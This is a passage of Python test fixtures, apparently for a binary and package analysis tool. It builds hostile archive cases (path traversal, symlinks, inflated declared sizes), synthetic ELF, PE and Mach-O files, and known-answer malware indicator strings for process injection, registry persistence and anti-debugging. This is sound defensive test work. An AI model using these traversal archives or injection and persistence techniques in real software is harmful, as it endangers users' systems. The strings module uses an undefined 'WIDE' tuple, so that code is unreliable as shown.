        specs = [F.member("package.json", package), F.member("ok.js", INDEX_JS),
                 F.member("../escape.js", INDEX_JS), F.member("../package.json", b'{"name": "outside"}'),
                 F.member("link.js", b"ok.js", 0, made_by=F.MADE_BY_UNIX, external_attr=0o120777 << 16),
                 F.member("locked.js", INDEX_JS, flags=F.ENCRYPTED),
                 F.member("dup.js", INDEX_JS), F.member("dup.js", b"var other = 2;\n"),
                 F.member("packed.js", INDEX_JS, 12), F.member("x" * 256 + ".js", INDEX_JS)]
        data, layout = archive(specs, strings={"package.json": strings})
        flags = {"../escape.js": ["traversing_name"], "../package.json": ["traversing_name"], "link.js": ["symlink"],
                 "locked.js": ["encrypted"], "dup.js": ["duplicate_name"], "packed.js": ["unsupported_method"],
                 "x" * 256 + ".js": ["long_name"]}
        _flagged_files(layout, [flags.get(row["name"], []) for row in layout["zip"]["members"]])
        layout["expect"] = {"js.files": "ok", "js.package": "ok", "js.hints": "ok"}
        return data, layout
    elif kind == "declared_over_128mib":
        # Five deflated members each declaring 30 MiB (150 MiB in all): the APK parser flags every member too_large
        # (and ratio), so no JavaScript is read
        specs = [F.member(f"part{i}.js", INDEX_JS) for i in range(5)]
        data, layout = archive(specs)
        patched = bytearray(data)
        for row in layout["zip"]["members"]:
            struct.pack_into("<I", patched, row["local_header_offset"] + 22, 30 * 1024 * 1024)
            struct.pack_into("<I", patched, row["central_offset"] + 24, 30 * 1024 * 1024)
            row["size"] = 30 * 1024 * 1024
        data = bytes(patched)
        _flagged_files(layout, [["ratio", "too_large"] for _ in specs])
        layout.update(size=len(data), sha256=hashlib.sha256(data).hexdigest(),
                      expect={"js.files": "ok", "js.package": "no rows", "js.hints": "no rows"})
        return data, layout
    elif kind == "zip_refused":
        # It starts with a ZIP local header but the parser refuses it (ZIP64), so every js
        # operation fails; it is never read as one script
        data, zipped = F.zip_archive([F.member("lib/index.js", INDEX_JS)], zip64=True)
        return data, {"size": len(data), "sha256": hashlib.sha256(data).hexdigest(), "zip": zipped, "files": [],
                      "packages": {}, "package": None, "default_package": None, "marks": {},
                      "expect": {"js.files": "refused", "js.package": "refused", "js.hints": "refused"}}
    else:
        raise ValueError(f"unknown hostile kind {kind!r}")
    built[1]["expect"] = {"js.files": "ok", "js.package": "refused", "js.hints": "ok"}
    return built

```

```py
"""Code-built, never executed ELF with exactly 10,000 named x86-64 functions."""

import struct


def elf_scale(count=10_000):
    if type(count) is not int or not 1 <= count <= 65_537:
        raise ValueError("Invalid scale fixture count")
    base, offset, stride = 0x400000, 0x100, 16
    text = b"".join(b"\xb8" + struct.pack("<I", index) + b"\xc3" + b"\xcc" * 10 for index in range(count))
    names = ["_start", *(f"function_{index:05d}" for index in range(1, count))]
    strings = bytearray(b"\0")
    symbols = bytearray(24)
    functions = []
    for index, name in enumerate(names):
        name_at = len(strings)
        strings.extend(name.encode("ascii") + b"\0")
        entry = base + offset + index * stride
        symbols.extend(struct.pack("<IBBHQQ", name_at, 0x12, 0, 1, entry, 6))
        functions.append({"name": name, "entry": entry, "offset": offset + index * stride, "size": 6})
    section_names = b"\0.text\0.symtab\0.strtab\0.shstrtab\0"
    sym_at = offset + len(text)
    str_at = sym_at + len(symbols)
    names_at = str_at + len(strings)
    section_at = (names_at + len(section_names) + 7) & ~7
    sections = [bytes(64),
                struct.pack("<IIQQQQIIQQ", 1, 1, 6, base + offset, offset, len(text), 0, 0, 16, 0),
                struct.pack("<IIQQQQIIQQ", 7, 2, 0, 0, sym_at, len(symbols), 3, 1, 8, 24),
                struct.pack("<IIQQQQIIQQ", 15, 3, 0, 0, str_at, len(strings), 0, 0, 1, 0),
                struct.pack("<IIQQQQIIQQ", 23, 3, 0, 0, names_at, len(section_names), 0, 0, 1, 0)]
    header = (b"\x7fELF" + bytes([2, 1, 1, 0]) + bytes(8)
              + struct.pack("<HHIQQQIHHHHHH", 2, 62, 1, base + offset, 64, section_at, 0,
                            64, 56, 1, 64, len(sections), 4))
    load = struct.pack("<IIQQQQQQ", 1, 5, 0, base, base, offset + len(text), offset + len(text), 0x1000)
    data = bytearray(header + load)
    data.extend(bytes(offset - len(data)) + text + symbols + strings + section_names)
    data.extend(bytes(section_at - len(data)) + b"".join(sections))
    return bytes(data), {"format": "elf", "functions": functions, "calls": [], "references": [], "strings": [],
                         "text": {"offset": offset, "address": base + offset, "size": len(text)}}
```

```py
"""Inert, generated known-answer strings. No executable or external samples."""

ASCII = (
    "OpenProcess VirtualAllocEx WriteProcessMemory CreateRemoteThread",
    "https://example.invalid/submit 203.0.113.7 WinHttpOpen BCryptEncrypt IsDebuggerPresent",

    r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run RegSetValueExW CryptEncrypt CheckRemoteDebuggerPresent",
    "https://wide.example.invalid/path 198.51.100.42 WSAStartup",
)
KNOWN = (
    ("OpenProcess", "open_process", "process_injection"),
    ("VirtualAllocEx", "virtual_alloc_ex", "process_injection"),
    ("WriteProcessMemory", "write_process_memory", "process_injection"),
    ("CreateRemoteThread", "create_remote_thread", "process_injection"),
    ("https://example.invalid/submit", "url", "network"),
    ("203.0.113.7", "ipv4", "network"),
    ("WinHttpOpen", "winhttp_open", "network"),
    ("BCryptEncrypt", "bcrypt_encrypt", "crypto"),
    ("IsDebuggerPresent", "is_debugger_present", "anti_debug"),
    (r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "registry_run", "persistence"),
    ("RegSetValueExW", "reg_set_value_ex", "persistence"),
    ("CryptEncrypt", "crypt_encrypt", "crypto"),
    ("CheckRemoteDebuggerPresent", "check_remote_debugger_present", "anti_debug"),
    ("https://wide.example.invalid/path", "url", "network"),
    ("198.51.100.42", "ipv4", "network"),
    ("WSAStartup", "wsa_startup", "network"),
)


def known_strings():
    data = bytearray(b"\x01\xff\x00\x02\x03")
    extracts = {"ascii": [], "utf16le": []}
    indicators = []
    for encoding, strings in (("ascii", ASCII), ("utf16le", WIDE)):
        width = 1 if encoding == "ascii" else 2
        for text in strings:
            offset = len(data)
            data.extend(text.encode("ascii" if width == 1 else "utf-16le"))
            data.extend(b"\x00\xff\x00\x01")
            extracts[encoding].append((offset, len(text) * width, {
                "text": text, "encoding": encoding, "truncated": False,
            }))
            for match, rule, category in KNOWN:
                # Whole names: CryptEncrypt is also a substring of BCryptEncrypt.
                start = text.find(match)
                if start < 0 or (start and text[start - 1].isalnum()):
                    continue
                indicators.append((offset + start * width, len(match) * width, {
                    "rule": rule, "category": category, "match": match,
                }))
    return bytes(data), extracts, sorted(indicators, key=lambda item: (item[0], item[2]["rule"]))


def clean_control():
    return b"\x00\xffNeutral fixture with ordinary descriptive words.\x00"
```

`tests/fixtures_structure.py`:

```py
"""Deterministic, inert ELF and PE fixtures built from declared values; no binary files.

Each builder returns (data, layout): the bytes and the offsets its fixed rules
produced, so tests can state exact expected observations.
"""

from __future__ import annotations

import struct

# (name, sh_type, sh_flags, size): .text is AX, .data WA, .rwx WAX (writable and executable).
ELF_SECTIONS = ((b".text", 1, 0x6, 32), (b".data", 1, 0x3, 16), (b".rwx", 1, 0x7, 8))
# (name, characteristics, raw size): code RX, data RW, rwx RWX.
PE_SECTIONS = ((b".text", 0x60000020, 0x200), (b".data", 0xC0000040, 0x200), (b".rwx", 0xE0000020, 0x200))


def elf(*, width=64, order="<", kind=2, machine=62, entry=0x401000, sections=ELF_SECTIONS, extended=False, shstrndx=None):
    """An ELF header, section contents, .shstrtab and a section table (null entry first, .shstrtab last).

    extended uses ELF extended numbering: e_shnum 0 and e_shstrndx SHN_XINDEX, with the real values in
    section 0's sh_size and sh_link; extended="index" moves only the name table index there.
    shstrndx overrides the name table index.
    """
    header_size, entry_size = (64, 64) if width == 64 else (52, 40)
    contents, offsets, position = b"", [], header_size
    for _, _, _, size in sections:
        offsets.append(position)
        contents += bytes(size)
        position += size
    names, name_offsets = b"\0", []
    for name, _, _, _ in sections:
        name_offsets.append(len(names))
        names += name + b"\0"
    shstrtab_name = len(names)
    names += b".shstrtab\0"
    strtab_offset = position
    position += len(names)
    shoff = (position + 7) & ~7
    shnum = len(sections) + 2
    word = "Q" if width == 64 else "I"
    layout = order + ("IIQQQQIIQQ" if width == 64 else "IIIIIIIIII")
    names_index = shnum - 1 if shstrndx is None else shstrndx
    count_moved, index_moved = extended is True, bool(extended)
    table = struct.pack(layout, 0, 0, 0, 0, 0, shnum if count_moved else 0, names_index if index_moved else 0, 0, 0, 0)
    for (name, sh_type, flags, size), name_offset, offset in zip(sections, name_offsets, offsets):
        table += struct.pack(layout, name_offset, sh_type, flags, 0, offset, size, 0, 0, 1, 0)
    table += struct.pack(layout, shstrtab_name, 3, 0, 0, strtab_offset, len(names), 0, 0, 1, 0)
    ident = b"\x7fELF" + bytes([2 if width == 64 else 1, 1 if order == "<" else 2, 1]) + bytes(9)
    header = ident + struct.pack(order + "HHI" + word * 3 + "IHHHHHH", kind, machine, 1, entry, 0, shoff, 0,
                                 header_size, 0, 0, entry_size, 0 if count_moved else shnum, 0xFFFF if index_moved else names_index)
    data = header + contents + names
    data += bytes(shoff - len(data)) + table
    return data, {"header_size": header_size, "entry_size": entry_size, "shoff": shoff, "shnum": shnum,
                  "offsets": offsets, "name_offsets": name_offsets, "strtab_offset": strtab_offset}


def pe(*, plus=True, machine=0x8664, entry_rva=0x1000, timestamp=0x5F5E1000, characteristics=0x22, sections=PE_SECTIONS,
       optional_size=None):
    """DOS header (e_lfanew 0x80), PE signature, COFF and optional headers, section table, raw data at 0x200 alignment.

    optional_size declares and lays out a shorter optional header (at least 20 bytes: magic through entry point).
    """
    lfanew, alignment = 0x80, 0x200
    optional_size = optional_size or (240 if plus else 224)
    dos = b"MZ" + bytes(0x3A) + struct.pack("<I", lfanew) + bytes(lfanew - 0x40)
    coff = struct.pack("<HHIIIHH", machine, len(sections), timestamp, 0, 0, optional_size, characteristics)
    optional = struct.pack("<HBBIIIII", 0x20B if plus else 0x10B, 14, 0, 0x200, 0x400, 0, entry_rva, 0x1000)
    optional = optional[:optional_size] + bytes(max(0, optional_size - len(optional)))
    table_offset = lfanew + 4 + 20 + optional_size
    headers_end = table_offset + 40 * len(sections)
    raw = (headers_end + alignment - 1) // alignment * alignment
    table, raw_offsets = b"", []
    for index, (name, flags, size) in enumerate(sections):
        raw_offsets.append(raw)
        table += struct.pack("<8sIIIIIIHHI", name, size, 0x1000 * (index + 1), size, raw, 0, 0, 0, 0, flags)
        raw += size
    data = dos + b"PE\0\0" + coff + optional + table
    data += bytes(raw_offsets[0] - len(data)) if sections else b""
    for _, _, size in sections:
        data += bytes(size)
    return data, {"lfanew": lfanew, "optional_size": optional_size, "table_offset": table_offset, "raw_offsets": raw_offsets}


def patched(data, offset, fmt, value):
    """A copy of data with one packed field replaced: the malformed variants below."""
    out = bytearray(data)
    struct.pack_into(fmt, out, offset, value)
    return bytes(out)


def malformed():
    """Named truncated or inconsistent inputs and the operations that must reject them with ValueError."""
    elf64, elf_layout = elf()
    pe64, pe_layout = pe()
    coff = pe_layout["lfanew"] + 4
    both, tables = ("structure.headers", "structure.sections"), ("structure.sections",)
    return {
        "elf truncated identification": (elf64[:10], both),
        "elf truncated header": (elf64[:40], both),
        "elf bad class": (patched(elf64, 4, "B", 9), both),
        "elf bad byte order": (patched(elf64, 5, "B", 0), both),
        "elf section table past end": (patched(elf64, 40, "<Q", len(elf64)), tables),
        "elf huge section count": (patched(elf64, 60, "<H", 0xFFFF), tables),
        "elf wrong section entry size": (patched(elf64, 58, "<H", 12), tables),
        "elf name table past end": (patched(elf64, elf_layout["shoff"] + 64 * (elf_layout["shnum"] - 1) + 24, "<Q", 2**63), tables),
        "elf truncated section table": (elf64[:elf_layout["shoff"] + 70], tables),
        "pe truncated coff": (pe64[:coff + 10], both),
        "pe truncated optional": (pe64[:coff + 30], both),
        "pe huge section count": (patched(pe64, coff + 2, "<H", 0xFFFF), tables),
        "pe huge optional size": (patched(pe64, coff + 16, "<H", 0xFFFF), tables),
        # Undersized: the following bytes exist, so only the declared size can reject them.
        "pe zero optional size": (patched(pe64, coff + 16, "<H", 0), both),
        "pe optional size below its fields": (patched(pe64, coff + 16, "<H", 8), both),
        "pe truncated section table": (pe64[:pe_layout["table_offset"] + 50], tables),
    }


def structure_evidence(data, task):
    """What a gateway would produce for the task, built without importing the gateway."""
    from reverseai.contract import make_evidence
    from reverseai.tools.structure import TOOL

    evidence = []
    for request in task.operations:
        spec = TOOL.operations[request.operation]
        for observation in spec.handler(data, spec.validate_args(request.args)):
            evidence.append(make_evidence(data, TOOL.ref, request.operation, observation))
    return tuple(evidence)


MACHO_SECTIONS = ((b"__text", b"__TEXT", 0x80000400, 5, 16),
                  (b"__data", b"__DATA", 0, 3, 8), (b"__rwx", b"__RWX", 0, 7, 8))


def macho(*, width=64, order="<", machine=None, sections=MACHO_SECTIONS, libraries=(), symbols=(), entry="main"):
    """Thin Mach-O, one segment per section, plus optional dylib/symtab/entry commands; no code is executed.

    Each section is (sectname, segname, flags, initprot, size). Symbols are undefined external
    nlist entries, except one defined control. layout gives every relevant field/name offset.
    """
    header_size, segment_size, section_size = (32, 72, 80) if width == 64 else (28, 56, 68)
    machine = machine if machine is not None else (0x1000007 if width == 64 else 7)
    commands, section_offsets, dylib_names = [], [], []
    position = header_size
    for _ in sections:
        section_offsets.append(position + segment_size)
        commands.append(bytes(segment_size + section_size))
        position += segment_size + section_size
    for index, name in enumerate(libraries):
        command = 0xC if index % 2 == 0 else 0x80000018
        size = (24 + len(name) + 1 + 7) & ~7
        dylib_names.append(position + 24)
        commands.append(struct.pack(order + "6I", command, size, 24, 0, 0, 0) + name + b"\0" + bytes(size - 25 - len(name)))
        position += size
    symtab_command = position if symbols else None
    if symbols:
        commands.append(bytes(24))
        position += 24
    entry_command = position if entry else None
    if entry == "main":
        commands.append(bytes(24))
        position += 24
    elif entry in ("x86_thread", "arm_thread"):
        count, pc_offset, flavor = (42, 128, 4) if entry == "x86_thread" else (68, 256, 6)
        state = bytearray(count * 4)
        commands.append(struct.pack(order + "4I", 5, 16 + len(state), flavor, count) + state)
        position += 16 + len(state)
    content_start = (position + 15) & ~15
    raw, section_addresses = content_start, []
    base = 0x100000000 if width == 64 else 0x1000
    for index, (sectname, segname, flags, prot, size) in enumerate(sections):
        address = base + raw
        section_addresses.append(address)
        if width == 64:
            segment = struct.pack(order + "II16sQQQQIIII", 0x19, segment_size + section_size, segname,
                                  address, size, raw, size, 7, prot, 1, 0)
            section = struct.pack(order + "16s16sQQIIIIIIII", sectname, segname, address, size, raw, 0, 0, 0, flags, 0, 0, 0)
        else:
            segment = struct.pack(order + "II16s8I", 1, segment_size + section_size, segname,
                                  address, size, raw, size, 7, prot, 1, 0)
            section = struct.pack(order + "16s16s9I", sectname, segname, address, size, raw, 0, 0, 0, flags, 0, 0)
        commands[index] = segment + section
        raw += size
    symbol_entry_size = 16 if width == 64 else 12
    symbols_offset = raw
    strings = b"\0"
    symbol_names = []
    entries = bytes(symbol_entry_size)  # Undefined null symbol must never become an import.
    for name in symbols:
        symbol_names.append(len(strings))
        values = (len(strings), 1, 0, 0, 0)
        entries += struct.pack(order + ("IBBHQ" if width == 64 else "IBBHI"), *values)
        strings += name + b"\0"
    # A defined symbol is a negative control, even though it has a name.
    entries += struct.pack(order + ("IBBHQ" if width == 64 else "IBBHI"), len(strings), 0xF, 1, 0, section_addresses[0] if sections else 1)
    strings += b"defined_control\0"
    strings_offset = symbols_offset + len(entries)
    if symbols:
        commands[len(sections) + len(libraries)] = struct.pack(order + "6I", 2, 24, symbols_offset,
                                                                            len(entries) // symbol_entry_size, strings_offset, len(strings))
    entry_address = section_addresses[0] if sections else 0
    if entry == "main":
        commands[-1] = struct.pack(order + "IIQQ", 0x80000028, 24, content_start, 0)
    elif entry in ("x86_thread", "arm_thread"):
        command = bytearray(commands[-1])
        struct.pack_into(order + "Q", command, 16 + pc_offset, entry_address)
        commands[-1] = bytes(command)
    command_bytes = b"".join(commands)
    header = struct.pack(order + "7I", 0xFEEDFACF if width == 64 else 0xFEEDFACE, machine, 3, 2, len(commands), len(command_bytes), 0)
    if width == 64:
        header += bytes(4)
    data = header + command_bytes + bytes(content_start - header_size - len(command_bytes)) + bytes(raw - content_start)
    if symbols:
        data += entries + strings
    return data, {"header_size": header_size, "section_size": section_size, "section_offsets": section_offsets,
                  "content_start": content_start, "addresses": section_addresses, "dylib_names": dylib_names,
                  "symtab_command": symtab_command, "symbols_offset": symbols_offset, "strings_offset": strings_offset,
                  "symbol_names": [strings_offset + i for i in symbol_names], "entry_command": entry_command, "entry": entry_address}


def macho_fat(*, width=32, order=">", machines=(7, 0x1000007, 0x100000C)):
    """Only the universal wrapper is needed by identify; no architecture slice is interpreted."""
    header = struct.pack(order + "II", 0xCAFEBABE if width == 32 else 0xCAFEBABF, len(machines))
    layout = order + ("5I" if width == 32 else "IIQQII")
    rows = b"".join(struct.pack(layout, machine, 0, 0, 0, 0, *(() if width == 32 else (0,))) for machine in machines)
    return header + rows


def elf_imports(*, width=64, order="<", libraries=(b"libalpha.so", b"libbeta.so"), symbols=(b"alpha", b"beta")):
    """SHT_DYNAMIC and SHT_DYNSYM linked to .dynstr, plus a defined-symbol negative control."""
    dynamic_entry, symbol_entry, section_entry = (16, 24, 64) if width == 64 else (8, 16, 40)
    names, library_offsets, symbol_offsets = b"\0", [], []
    for group, offsets in ((libraries, library_offsets), (symbols, symbol_offsets)):
        for name in group:
            offsets.append(len(names))
            names += name + b"\0"
    defined = len(names)
    names += b"defined_control\0"
    dynamic = b"".join(struct.pack(order + ("QQ" if width == 64 else "II"), 1, i) for i in library_offsets) + bytes(dynamic_entry)
    syms = bytes(symbol_entry)
    for i in symbol_offsets + [defined]:
        section = 1 if i == defined else 0
        syms += struct.pack(order + "IBBHQQ", i, 0x12, 0, section, 0, 0) if width == 64 else struct.pack(order + "IIIBBH", i, 0, 0, 0x12, 0, section)
    data, layout = elf(width=width, order=order, sections=((b".dynamic", 6, 3, len(dynamic)),
                            (b".dynstr", 3, 2, len(names)), (b".dynsym", 11, 2, len(syms))))
    out = bytearray(data)
    for offset, value in zip(layout["offsets"], (dynamic, names, syms)):
        out[offset:offset + len(value)] = value
    for index, entsize in ((1, dynamic_entry), (3, symbol_entry)):
        header = layout["shoff"] + index * section_entry
        struct.pack_into(order + "I", out, header + (40 if width == 64 else 24), 2)
        struct.pack_into(order + ("Q" if width == 64 else "I"), out, header + (56 if width == 64 else 36), entsize)
    layout.update(library_names=[layout["offsets"][1] + i for i in library_offsets],
                  symbol_names=[layout["offsets"][1] + i for i in symbol_offsets], dynamic=layout["offsets"][0],
                  dynsym=layout["offsets"][2], strings=layout["offsets"][1], strings_size=len(names))
    return bytes(out), layout


def pe_imports(*, plus=True, libraries=((b"KERNEL32.dll", (b"ExitProcess", 7)), (b"USER32.dll", (b"MessageBoxA",))), original=True):
    """One .idata section with import descriptors, DLL names, hints/names and terminated thunk lists."""
    descriptor_size, rva, word = 20 * (len(libraries) + 1), 0x1000, 8 if plus else 4
    blob = bytearray(descriptor_size)
    dll_names, symbol_names, thunk_offsets = [], [], []
    for index, (library, symbols) in enumerate(libraries):
        name_offset = len(blob)
        dll_names.append(name_offset)
        blob += library + b"\0"
        values, offsets = [], []
        for symbol in symbols:
            if isinstance(symbol, int):
                values.append((1 << (word * 8 - 1)) | symbol)
                offsets.append(None)
            else:
                blob += bytes(-len(blob) % 2)
                values.append(rva + len(blob))
                offsets.append(len(blob) + 2)
                blob += bytes(2) + symbol + b"\0"
        blob += bytes(-len(blob) % word)
        thunks = len(blob)
        thunk_offsets.append(thunks)
        for i, value in enumerate(values):
            blob += struct.pack("<Q" if plus else "<I", value)
            if offsets[i] is None:
                offsets[i] = thunks + word * i
        blob += bytes(word)
        symbol_names.append(offsets)
        struct.pack_into("<5I", blob, index * 20, rva + thunks if original else 0, 0, 0, rva + name_offset, rva + thunks)
    raw_size = (len(blob) + 0x1FF) & ~0x1FF
    data, layout = pe(plus=plus, sections=((b".idata", 0xC0000040, raw_size),))
    out = bytearray(data)
    raw = layout["raw_offsets"][0]
    optional = layout["lfanew"] + 24
    directories = optional + (112 if plus else 96)
    struct.pack_into("<I", out, directories - 4, 16)
    struct.pack_into("<II", out, directories + 8, rva, descriptor_size)
    struct.pack_into("<I", out, optional + 60, raw)
    out[raw:raw + len(blob)] = blob
    layout.update(descriptor=raw, directory=directories + 8, library_names=[raw + i for i in dll_names],
                  symbol_names=[[raw + i for i in group] for group in symbol_names],
                  thunks=[raw + i for i in thunk_offsets], word=word)
    return bytes(out), layout


def elf_dynamic_imports(*, width=64, order="<", gnu_hash=False):
    """Sectionless ELF with PT_LOAD/PT_DYNAMIC and a SysV or GNU dynamic-symbol hash table."""
    header_size, phsize, symsize = (64, 56, 24) if width == 64 else (52, 32, 16)
    base, dynamic_offset, hash_offset, symbols_offset, strings_offset = 0x400000, 0x100, 0x180, 0x200, 0x300
    names = b"\0libalpha.so\0alpha\0beta\0defined\0"
    names_at = [1, 13, 19, 24]
    symbols = bytes(symsize)
    for name, section in ((names_at[1], 0), (names_at[2], 0), (names_at[3], 1)):
        symbols += struct.pack(order + "IBBHQQ", name, 0x12, 0, section, 0, 0) if width == 64 else struct.pack(order + "IIIBBH", name, 0, 0, 0x12, 0, section)
    if gnu_hash:
        hashed = struct.pack(order + "4I", 1, 3, 1, 0) + bytes(width // 8) + struct.pack(order + "II", 3, 1)
    else:
        hashed = struct.pack(order + "7I", 1, 4, 3, 0, 0, 0, 0)
    tags = ((1, 1), (5, base + strings_offset), (10, len(names)), (6, base + symbols_offset),
            (11, symsize), (0x6FFFFEF5 if gnu_hash else 4, base + hash_offset), (0, 0))
    dynamic = b"".join(struct.pack(order + ("QQ" if width == 64 else "II"), *tag) for tag in tags)
    size = strings_offset + len(names)
    ident = b"\x7fELF" + bytes((2 if width == 64 else 1, 1 if order == "<" else 2, 1)) + bytes(9)
    word = "Q" if width == 64 else "I"
    header = ident + struct.pack(order + "HHI" + word * 3 + "IHHHHHH", 3, 62, 1, 0, header_size, 0, 0,
                                  header_size, phsize, 2, 64 if width == 64 else 40, 0, 0)
    if width == 64:
        program = struct.pack(order + "IIQQQQQQ", 1, 4, 0, base, base, size, size, 0x1000)
        program += struct.pack(order + "IIQQQQQQ", 2, 4, dynamic_offset, base + dynamic_offset, base + dynamic_offset, len(dynamic), len(dynamic), 8)
    else:
        program = struct.pack(order + "8I", 1, 0, base, base, size, size, 4, 0x1000)
        program += struct.pack(order + "8I", 2, dynamic_offset, base + dynamic_offset, base + dynamic_offset, len(dynamic), len(dynamic), 4, 4)
    out = bytearray(size)
    out[:len(header + program)] = header + program
    for start, value in ((dynamic_offset, dynamic), (hash_offset, hashed), (symbols_offset, symbols), (strings_offset, names)):
        out[start:start + len(value)] = value
    return bytes(out), {"library_names": [strings_offset + 1], "symbol_names": [strings_offset + 13, strings_offset + 19],
                        "dynamic": dynamic_offset, "hash": hash_offset}


def elf_dynamic_mapping_product(count=2000, *, distinct=False):
    """Many PT_LOAD/PT_DYNAMIC headers: repeated ambiguous aliases, or distinct unmapped queries."""
    phoff, phsize, base = 64, 56, 0x400000
    dynamic = phoff + phsize * count * 2
    tables = count if distinct else 1
    strings = dynamic + tables * 48
    total = strings + 2
    ident = b"\x7fELF" + bytes((2, 1, 1)) + bytes(9)
    header = ident + struct.pack("<HHIQQQIHHHHHH", 3, 62, 1, 0, phoff, 0, 0, 64, phsize, count * 2, 64, 0, 0)
    if distinct:
        loads = b"".join(struct.pack("<IIQQQQQQ", 1, 4, strings, base + i * 4, base + i * 4, 2, 2, 1)
                         for i in range(count))
    else:
        load = struct.pack("<IIQQQQQQ", 1, 4, 0, base, base, total, total, 0x1000)
        loads = load * count
    dynamics = b"".join(struct.pack("<IIQQQQQQ", 2, 4, dynamic + (i * 48 if distinct else 0), 0, 0, 48, 48, 8)
                        for i in range(count))
    tags = b"".join(struct.pack("<6Q", 5, base + count * 4 + 16 + i * 4 if distinct else base + strings,
                               10, 2, 0, 0) for i in range(tables))
    return header + loads + dynamics + tags + b"x\0"


def elf_dynamic_hash_product(*, chains=True, tables=200, entries=2000):
    """Distinct dynamic tables share a large GNU hash table and an unmapped symbol pointer."""
    base = 0x400000
    hash_offset = (64 + 56 * (tables + 1) + 15) & ~15
    buckets = 1 if chains else entries
    hashed = struct.pack("<4I", buckets, 1, 1, 0) + bytes(8)
    bucket_start = hash_offset + len(hashed)
    hashed += struct.pack("<I", 1) if chains else bytes(4 * entries)
    chain_start = hash_offset + len(hashed)
    if chains:
        hashed += struct.pack("<I", 2) * (entries - 1) + struct.pack("<I", 1)
    dynamic = (hash_offset + len(hashed) + 15) & ~15
    strings = dynamic + tables * 96
    total = strings + 2
    tags = b"".join(struct.pack("<QQ", tag, value) for tag, value in (
        (5, base + strings), (10, 2), (6, base + total + 0x1000), (11, 24), (0x6FFFFEF5, base + hash_offset), (0, 0)))
    ident = b"\x7fELF" + bytes((2, 1, 1)) + bytes(9)
    header = ident + struct.pack("<HHIQQQIHHHHHH", 3, 62, 1, 0, 64, 0, 0, 64, 56, tables + 1, 64, 0, 0)
    program = struct.pack("<IIQQQQQQ", 1, 4, 0, base, base, total, total, 0x1000)
    program += b"".join(struct.pack("<IIQQQQQQ", 2, 4, dynamic + i * 96, 0, 0, 96, 96, 8) for i in range(tables))
    out = bytearray(total)
    out[:len(header + program)] = header + program
    out[hash_offset:hash_offset + len(hashed)] = hashed
    out[dynamic:strings] = tags * tables
    out[strings:] = b"x\0"
    return bytes(out), {"counted_start": chain_start if chains else bucket_start, "counted_end": chain_start + entries * 4 if chains else chain_start}


def pe_exports(*, plus=True, names=(b"hello", b"world", b"slash/name")):
    """Named exports in .edata, with independent RVA/name/ordinal/function tables."""
    data, layout = pe(plus=plus, sections=((b".text", 0x60000020, 0x200), (b".edata", 0x40000040, 0x800)))
    data = bytearray(data)
    optional = layout["lfanew"] + 24
    base = 0x140000000 if plus else 0x400000
    struct.pack_into("<Q" if plus else "<I", data, optional + (24 if plus else 28), base)
    struct.pack_into("<I", data, optional + 60, layout["raw_offsets"][0])
    directories = 112 if plus else 96
    struct.pack_into("<I", data, optional + directories - 4, 16)
    struct.pack_into("<II", data, optional + directories, 0x2000, 0x800)
    export = layout["raw_offsets"][1]
    entries, pointers, ordinals, cursor = 0x40, 0x100, 0x180, 0x200
    struct.pack_into("<IIHH7I", data, export, 0, 0, 0, 0, 0, 1, len(names), len(names),
                     0x2000 + entries, 0x2000 + pointers, 0x2000 + ordinals)
    symbols = []
    for index, name in enumerate(names):
        struct.pack_into("<I", data, export + entries + 4 * index, 0x1000 + index * 8)
        struct.pack_into("<I", data, export + pointers + 4 * index, 0x2000 + cursor)
        struct.pack_into("<H", data, export + ordinals + 2 * index, index)
        data[export + cursor:export + cursor + len(name) + 1] = name + b"\0"
        symbols.append(dict(name=name, offset=export + cursor, address=base + 0x1000 + index * 8))
        cursor += len(name) + 1
    layout.update(image_base=base, export=export, optional=optional, symbols=symbols,
                  entries=export + entries, pointers=export + pointers, ordinals=export + ordinals)
    return bytes(data), layout


def elf_symbols(*, width=64, order="<", dynamic=False):
    """A symbol table with a function, object, weak undefined import and skipped section/file entries."""
    names = b"\0main\0object\0weak_import\0section\0file\0"
    offsets = [names.index(name) for name in (b"main", b"object", b"weak_import", b"section", b"file")]
    declared = [(offsets[0], 0x1000, 2, 1, 1), (offsets[1], 0x2000, 1, 0, 1),
                (offsets[2], 0, 0, 2, 0), (offsets[3], 0, 3, 0, 1), (offsets[4], 0, 4, 0, 0)]
    stride = 24 if width == 64 else 16
    data, layout = elf(width=width, order=order, sections=((b".dynsym" if dynamic else b".symtab", 11 if dynamic else 2, 0,
                                                           stride * (len(declared) + 1)), (b".strtab", 3, 0, len(names))))
    data = bytearray(data)
    symbols, strings = layout["offsets"]
    data[strings:strings + len(names)] = names
    sh = layout["shoff"] + layout["entry_size"]
    struct.pack_into(order + "I", data, sh + (40 if width == 64 else 24), 2)
    struct.pack_into(order + ("Q" if width == 64 else "I"), data, sh + (56 if width == 64 else 36), stride)
    for index, (name, address, type_, binding, section) in enumerate(declared, 1):
        values = (name, binding * 16 + type_, 0, section, address, 1) if width == 64 else (name, address, 1,
                                                                                     binding * 16 + type_, 0, section)
        struct.pack_into(order + ("IBBHQQ" if width == 64 else "IIIBBH"), data, symbols + stride * index, *values)
    layout.update(symbols=symbols, strings=strings)
    return bytes(data), layout
```

`tests/fixtures_tgz.py`:

```py
"""Code-built npm tarballs; all JavaScript is inert data, never imported or run.

npm_tgz() and tgz_hostile(kind) return (gzip bytes, layout). Offsets in members,
files, package, hints, modules and calls refer to the decompressed tar or its
declared child as named. Accepted files carry method 1 artifacts;
flagged and empty rows cite their own 512-byte header as a child of the gzip.
"""

import hashlib
import struct
import zlib

from tests import fixtures_js as F

BLOCK = 512
PAX_PATH = 'package/lib/' + 'long-name-' * 12 + 'module.mjs'
PACKAGE = {
    'name': '@fixture/tgz-app', 'version': '1.0.0', 'main': 'index.js', 'type': 'module',
    'scripts': {'preinstall': 'node setup.js', 'postinstall': 'node index.js --install', 'test': 'node --test'},
    'dependencies': {'left-pad': '1.3.0', '@fixture/helper': '^2.0.0'},
}
HOSTILE_KINDS = (
    'symlink', 'hardlink', 'traversal', 'duplicate', 'long_name', 'truncated_tar', 'bad_tar_checksum',
    'gzip_trailing_data', 'gzip_concatenated', 'gzip_crc', 'gzip_isize', 'ratio', 'too_many_entries', 'not_gzip',
)


def gzip_bytes(data, *, level=6):
    """One fixed-header gzip member, without platform-dependent metadata."""
    compressor = zlib.compressobj(level, zlib.DEFLATED, -15)
    body = compressor.compress(data) + compressor.flush()
